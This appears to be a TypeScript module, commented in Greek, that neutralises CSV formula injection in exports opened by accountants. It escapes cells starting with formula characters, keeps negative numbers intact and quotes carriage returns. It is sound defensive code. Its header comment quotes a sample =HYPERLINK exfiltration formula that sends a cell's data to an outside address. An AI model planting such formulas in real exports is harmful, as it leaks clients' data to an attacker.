// ΤΟ CSV ΠΟΥ ΑΝΟΙΓΕΙ Ο ΛΟΓΙΣΤΗΣ ΔΕΝ ΕΚΤΕΛΕΙΤΑΙ
// ─────────────────────────────────────────────────────────────────────────
// Το Excel και το LibreOffice δεν διαβάζουν το CSV ως κείμενο. Κάθε κελί που
// ΑΡΧΙΖΕΙ με `=`, `+`, `@`, στηλοθέτη ή χαρακτήρα επαναφοράς το θεωρούν τύπο
// και το ΕΚΤΕΛΟΥΝ όταν ανοίξει το αρχείο.
//
// Η ΑΛΥΣΙΔΑ ΕΙΝΑΙ ΠΡΑΓΜΑΤΙΚΗ ΚΑΙ ΞΕΚΙΝΑ ΑΠΟ ΞΕΝΟ ΧΕΡΙ. Ο επισκέπτης γράφει το
// ονοματεπώνυμό του σε δημόσια φόρμα άφιξης· ο ενοικιαστής γράφει την περιγραφή
// μιας βλάβης· ο ιδιοκτήτης εξάγει τον φάκελο για τον λογιστή του· ο λογιστής
// ανοίγει το αρχείο. Αν το όνομα ήταν
// `=HYPERLINK("http://…"&A1;"Πάτησε εδώ")`, ο τύπος τρέχει στον υπολογιστή του
// λογιστή, με τα δεδομένα όλων των πελατών του ανοιχτά δίπλα.
//
// Η ΑΜΥΝΑ ΕΙΝΑΙ ΕΝΑΣ ΑΠΟΣΤΡΟΦΟΣ. Το Excel δείχνει το κείμενο και δεν το
// εκτελεί. Δεν αλλάζει τίποτα στο περιεχόμενο που διαβάζει ο άνθρωπος.
//
// ΤΟ ΜΕΙΟΝ ΕΙΝΑΙ ΕΞΑΙΡΕΣΗ, ΚΑΙ ΕΙΝΑΙ ΣΗΜΑΝΤΙΚΗ. Το `-45,00` είναι αρνητικό
// ποσό, όχι επίθεση, και ένας απόστροφος μπροστά του θα το έκανε ΚΕΙΜΕΝΟ: ο
// λογιστής θα εισήγαγε στήλη που δεν αθροίζεται. Το μείον προστατεύεται μόνο
// όταν αυτό που ακολουθεί ΔΕΝ είναι αριθμός.
// ═══════════════════════════════════════════════════════════════════════════

/** Αριθμός σε ελληνική ή διεθνή μορφή: «-1.234,56», «-1234.56», «-45». */
const NUMERIC = /^-?[\d.,\s]+$/;

/**
 * Ουδετεροποιεί κελί που το φύλλο θα εκτελούσε ως τύπο.
 *
 * Επιστρέφει το κελί αυτούσιο όταν δεν υπάρχει κίνδυνος: η συντριπτική
 * πλειονότητα των κελιών δεν αγγίζεται καθόλου.
 */
export function csvSafeValue(value: unknown): string {
  const s = String(value ?? '');
  if (!s) return s;
  const c = s[0];
  if (c === '=' || c === '+' || c === '@' || c === '\t' || c === '\r') return `'${s}`;
  if (c === '-' && !NUMERIC.test(s)) return `'${s}`;
  return s;
}

/**
 * Ένα κελί CSV: ουδέτερο για το φύλλο, και σωστά εισαγωγικά για τον αναλυτή.
 *
 * Ο χαρακτήρας επαναφοράς (CR) ΜΟΝΟΣ ΤΟΥ έσπαγε γραμμή σε αρκετούς αναλυτές
 * χωρίς να τον πιάνει ο έλεγχος εισαγωγικών, γιατί ο έλεγχος κοιτούσε μόνο
 * νέα γραμμή. Μια περιγραφή με CR μετέθετε ΟΛΕΣ τις επόμενες στήλες κατά μία.
 */
export function csvCell(value: unknown, separator = ';'): string {
  const s = csvSafeValue(value);
  const needsQuotes = s.includes('"') || s.includes(separator) || s.includes('\n') || s.includes('\r');
  return needsQuotes ? `"${s.replace(/"/g, '""')}"` : s;
}
